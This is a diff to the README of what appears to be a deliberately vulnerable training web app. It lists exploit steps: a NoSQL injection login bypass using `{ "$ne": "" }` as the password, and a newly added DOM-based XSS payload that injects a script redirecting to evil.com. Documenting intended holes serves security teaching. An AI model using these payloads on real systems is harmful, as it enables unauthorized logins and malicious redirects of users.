@@ -20,6 +20,10 @@ Log in as any existing user.
 -   Enter `james` as the username
 -   Enter `{ "$ne": "" }` as the password
 
+### DOM-Based XSS 
+
+- Enter `"><script> window.location='http://www.evil.com' </script>` in the Text to Binary Converter.
+
 # For developers
 
 ### Initial setup:
